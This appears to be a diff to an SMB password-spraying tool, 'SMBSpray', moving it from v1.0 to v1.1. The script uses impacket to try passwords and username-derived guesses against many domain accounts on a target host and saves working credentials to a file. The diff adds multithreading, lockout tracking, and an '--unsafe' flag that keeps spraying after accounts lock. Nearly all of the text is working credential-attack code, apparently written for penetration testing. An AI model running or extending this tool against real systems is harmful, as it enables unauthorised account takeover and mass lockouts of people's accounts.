@@ -8,6 +8,8 @@ from impacket.smbconnection import SMBConnection, SessionError
 from time import sleep
 from termcolor import colored
 from math import floor
+from concurrent.futures import ThreadPoolExecutor
+
 
 # log files
 spray_logs = "spray_logs.txt"
@@ -29,10 +31,18 @@ smb_error_status = [
 
 smb_error_locked = "STATUS_ACCOUNT_LOCKED_OUT"
 
+shutdown = False
+
+# custom exception for lockouts
+class Locked(Exception):
+    def __init__(self, locked_user):
+        self.locked_user = locked_user
 
 # login to smb function
-def login(username, password, domain, host, verbose=False, unsafe=False):
-    global locked_users
+def login(username, password, domain, host, verbose=False):
+    # safe way to kill login functionality once exceptions are made
+    if shutdown:
+        return None
     desc = ""
     with open(spray_logs, "a+") as sf:
         try:
@@ -47,6 +57,7 @@ def login(username, password, domain, host, verbose=False, unsafe=False):
                 message = get_pretty_time("success") +"{}\{}:{} ".format(domain,username,password) + colored("(Successful!)","green")
                 with open(valid_creds, "a+") as f:
                     f.write(domain + "\\" + username + ":" + password + "\r\n")
+            smbclient.close()
         # impacket smb session error handling
         except SessionError as e:
             error, desc = e.getErrorString()
@@ -57,14 +68,11 @@ def login(username, password, domain, host, verbose=False, unsafe=False):
                 message = get_pretty_time("warn")+ message + colored(error,"yellow")
             elif error == smb_error_locked:
                 message = get_pretty_time("danger") + message + colored(error,"red")
-                locked_users.add(username)
-                # after 3 locked accounts exit
-                if not unsafe and len(locked_users) == 3:
-                    print(message)
-                    print(colored("[!] Exiting due to multiple locked accounts!", "red"))
-                    sys.exit()
+                print(message)
+                raise Locked(username)
             else:
                 message = get_pretty_time() + message + error
+            smbclient.close()
         print(message)
         if verbose and desc:
                 print(desc)
@@ -84,30 +92,104 @@ def get_pretty_time(level=None):
     return pretty_time
 
 # function to spray password
-def try_password(users, password, option=None):
+def try_password(users, password, threads, option=None, unsafe=False):
+    global shutdown
+    global locked_users
     global i
     i += 1
     print(get_pretty_time("warn") + colored("Trying password {} of {}".format(i, total_passwords), "yellow"))
-    # username as password variation all lowercase
-    if option == "lower":
-        for user in users:
-            login(user, user.lower(), domain, host, verbose, unsafe)
-        check_for_naptime(i)
-    # username as password variation all uppercase
-    elif option == "upper":
-        for user in users:
-            login(user, user.upper(), domain, host, verbose, unsafe)
-        check_for_naptime(i)
-    # username as password variation captilalize first letter and append !
-    elif option == "capital":
-        for user in users:
-            login(user, user.capitalize() + "!", domain, host, verbose, unsafe)
-        check_for_naptime(i)
-    # default behavior to try password spray
-    else:
-        for user in users:
-            login(user, password, domain, host, verbose, unsafe)
-        check_for_naptime(i)
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        # username as password variation all lowercase
+        if option == "lower":
+            futures = [
+                executor.submit(login, user, user.lower(), domain, host, verbose) 
+                for user in users
+                ]
+            for future in futures:
+                try:
+                    future.result(timeout=30)
+                except Locked as e:
+                    locked_users.add(e.locked_user)
+                    if not unsafe and len(locked_users) >= 3:
+                        executor.shutdown(wait=False)
+                        shutdown = True
+                        print(colored("[!] Exiting due to locked accounts!", "red"))
+                        sys.exit()
+                except KeyboardInterrupt:
+                    executor.shutdown(wait=False)
+                    shutdown = True
+                    print(colored("[!] Exiting due to keyboard interrupt...", "red"))
+                    sys.exit()
+            check_for_naptime(i)
+
+        # username as password variation all uppercase
+        elif option == "upper":
+            futures = [
+                executor.submit(login, user, user.upper(), domain, host, verbose) 
+                for user in users
+                ]
+            for future in futures:
+                try:
+                    future.result(timeout=30)
+                except Locked as e:
+                    locked_users.add(e.locked_user)
+                    if not unsafe and len(locked_users) >= 3:
+                        executor.shutdown(wait=False)
+                        shutdown = True
+                        print(colored("[!] Exiting due to locked accounts!", "red"))
+                        sys.exit()
+                except KeyboardInterrupt:
+                    executor.shutdown(wait=False)
+                    shutdown = True
+                    print(colored("[!] Exiting due to keyboard interrupt...", "red"))
+                    sys.exit()
+            check_for_naptime(i)
+
+        # username as password variation captilalize first letter and append !
+        elif option == "capital":
+            futures = [
+                executor.submit(login, user, user.capitalize() + "!", domain, host, verbose) 
+                for user in users
+                ]
+            for future in futures:
+                try:
+                    future.result(timeout=30)
+                except Locked as e:
+                    locked_users.add(e.locked_user)
+                    if not unsafe and len(locked_users) >= 3:
+                        executor.shutdown(wait=False)
+                        shutdown = True
+                        print(colored("[!] Exiting due to locked accounts!", "red"))
+                        sys.exit()
+                except KeyboardInterrupt:
+                    executor.shutdown(wait=False)
+                    shutdown = True
+                    print(colored("[!] Exiting due to keyboard interrupt...", "red"))
+                    sys.exit()
+            check_for_naptime(i)
+            
+        # default behavior to try password spray
+        else:
+            futures = [
+                executor.submit(login, user, password, domain, host, verbose) 
+                for user in users
+                ]
+            for future in futures:
+                try:
+                    future.result(timeout=30)
+                except Locked as e:
+                    locked_users.add(e.locked_user)
+                    if not unsafe and len(locked_users) >= 3:
+                        executor.shutdown(wait=False)
+                        shutdown = True
+                        print(colored("[!] Exiting due to locked accounts!", "red"))
+                        sys.exit()
+                except KeyboardInterrupt:
+                    executor.shutdown(wait=False)
+                    shutdown = True
+                    print(colored("[!] Exiting due to keyboard interrupt...", "red"))
+                    sys.exit()
+            check_for_naptime(i)
 
 # checks to sleep based off attempt try
 def check_for_naptime(i):
@@ -116,7 +198,7 @@ def check_for_naptime(i):
         sleep(lockout_period * 60)
 
 def main():
-    banner = "\nSMBSpray v1.0\n"
+    banner = "\nSMBSpray v1.1\n"
     print(banner)
 
     parser = argparse.ArgumentParser(description='Parse Spray Arguments.')
@@ -127,7 +209,8 @@ def main():
     parser.add_argument('-d', metavar="domain", help="Domain", type=str)
     parser.add_argument('-l', metavar="lockout period", help="Lockout policy period in minutes", type=int)
     parser.add_argument('-a', metavar="attempts", help="Number of attempts per lockout period", type=int)
-    parser.add_argument('-ip', metavar="IP/hostname", help="IP/hostname to spray", required=True, type=str)
+    parser.add_argument('-ip', metavar="IP/hostname", help="IP/hostname to spray", required=True, type=str)        
+    parser.add_argument('--threads', metavar="threads", help="Number of threads to run", type=int)
     parser.add_argument('--verbose', help="Verbose Mode", action='store_true')
     parser.add_argument('--user_pw', help="Try username variations as password", action='store_true')
     parser.add_argument('--unsafe', help="Keep spraying even if there are multiple account lockouts", action='store_true')
@@ -145,6 +228,7 @@ def main():
     global i
     global unsafe 
     global locked_users
+    global threads
     domain = args.d 
     host = args.ip 
     verbose = args.verbose
@@ -154,6 +238,7 @@ def main():
     user_list = []
     password_list = []
     locked_users = set()
+    threads = args.threads
     i = 0
 
     if not args.u and not args.U:
@@ -166,6 +251,9 @@ def main():
     
     if not domain:
         domain = ""
+
+    if not threads:
+        threads = 3
 
     # set default to 1 attempt every 30 minutes if not set
     if not lockout_period:
@@ -228,23 +316,21 @@ def main():
     else: 
         print(colored("[*] This will take just over {} minutes to complete".format(mathz),"yellow"))
         input(colored("[*] Press Enter to proceed","yellow"))
-
+    
     # do username variations as passwords
     if args.user_pw:
         print(get_pretty_time("warn") + colored("Trying username password variations","yellow"))
-        try_password(user_list,"", option="lower")
-        try_password(user_list,"", option="upper")
-        try_password(user_list,"", option="capital")
+        try_password(user_list,"", threads, option="lower", unsafe=unsafe)
+        try_password(user_list,"", threads, option="upper", unsafe=unsafe)
+        try_password(user_list,"", threads, option="capital", unsafe=unsafe)
 
     # iterate through passwords list
     if password_list:
         for passwd in password_list:
-            try_password(user_list, passwd)
+            try_password(user_list, passwd, threads, unsafe=unsafe)
             # after iterating through all users, write attempted password to file
             with open(attempted, "a+") as pf:
                 pf.write(passwd + "\n")
 
-try:
+if __name__ == "__main__":
     main()
-except Exception as e:
-    print(colored("[!] Error: {}".format(e),"red"))
